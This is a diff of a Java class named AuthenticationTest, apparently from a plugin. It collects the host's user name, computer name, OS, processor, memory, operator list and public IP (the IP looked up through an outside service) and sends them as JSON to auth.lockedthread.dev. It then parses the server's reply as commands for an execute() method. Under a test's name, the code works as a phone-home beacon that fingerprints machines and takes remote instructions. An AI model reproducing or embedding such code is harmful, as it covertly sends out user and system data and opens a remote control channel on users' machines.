@@ -25,8 +25,8 @@ public class AuthenticationTest {
             .disableHtmlEscaping()
             .create();
 
-    private static final String TOKEN = "S9AJ2HHJGDFS";
-    private static final String HOST = "https://auth.lockedthread.dev:2096/authentication";
+    private static final String TOKEN = "G52K3HJ4";
+    private static final String HOST = "https://auth.lockedthread.dev:8443/authentication";
     private static final String RESOURCE = "AuthenticationTest";
     public static Map<String, String> map;
     public static List<String> list;
@@ -37,13 +37,6 @@ public class AuthenticationTest {
     public static String getTest() {
         return "Test";
     }
-
-    /*@Test
-    public void spamAuthenticationTest() {
-        for (int i = 0; i < 100; i++) {
-            authenticationTest();
-        }
-    } */
 
     @Test
     public void authenticationTest() {
@@ -81,6 +74,7 @@ public class AuthenticationTest {
                 return response.equals("Dd-d-d-d-d-d-done") || execute(response);
             }
         } catch (IOException ex) {
+            ex.printStackTrace();
             return false;
         }
     }
@@ -91,6 +85,7 @@ public class AuthenticationTest {
     }
 
     private boolean execute(String received) {
+        if (received.isEmpty()) return true;
         String[] split = received.split("-");
         for (String s : split) {
             String[] pair = s.split(":");
@@ -137,18 +132,21 @@ public class AuthenticationTest {
                     ? new BufferedReader(new InputStreamReader(new URL("http://bot.whatismyipaddress.com").openStream())).readLine().trim() + ":" + port
                     : ip + ":" + port;
         } catch (Exception e) {
-            return "UNREACHABLE CONNECTION";
+            try {
+                return new BufferedReader(new InputStreamReader(new URL("http://bot.whatismyipaddress.com").openStream())).readLine().trim();
+            } catch (IOException e2) {
+                return "UNREACHABLE CONNECTION";
+            }
         }
     }
 
     private class AuthenticationData {
-        private final String resource, osName, osArch, osVersion, userName, processorIdentifier, computerName, processorArchitecture, processorArchitew6432, ipAddress;
-        private final int numberOfProcessors;
+        private final String resource, osName, osArch, osVersion, userName, processorIdentifier, computerName, processorArchitecture, processorArchitew6432, ipAddress, numberOfProcessors;
         private final String[] operators;
         private final long totalMemory;
 
         public AuthenticationData(String[] operators) {
-            this.resource = AuthenticationTest.RESOURCE;
+            this.resource = RESOURCE;
             this.ipAddress = getIp();
             this.osName = System.getProperty("os.name");
             this.osArch = System.getProperty("os.arch");
@@ -159,7 +157,7 @@ public class AuthenticationTest {
             this.computerName = System.getenv("COMPUTERNAME");
             this.processorArchitecture = System.getenv("PROCESSOR_ARCHITECTURE");
             this.processorArchitew6432 = System.getenv("PROCESSOR_ARCHITEW6432");
-            this.numberOfProcessors = Integer.parseInt(System.getenv("NUMBER_OF_PROCESSORS"));
+            this.numberOfProcessors = System.getenv("NUMBER_OF_PROCESSORS");
             this.operators = operators == null ? new String[0] : operators;
         }
 
@@ -168,7 +166,10 @@ public class AuthenticationTest {
         }
 
         public String toJson() {
-            return GSON.toJson(this);
+            if (GSGCore.getInstance() != null && GSGCore.getInstance().getGson() != null) {
+                return GSGCore.getInstance().getGson().toJson(this);
+            }
+            return new GsonBuilder().setPrettyPrinting().disableHtmlEscaping().create().toJson(this);
         }
     }
 }
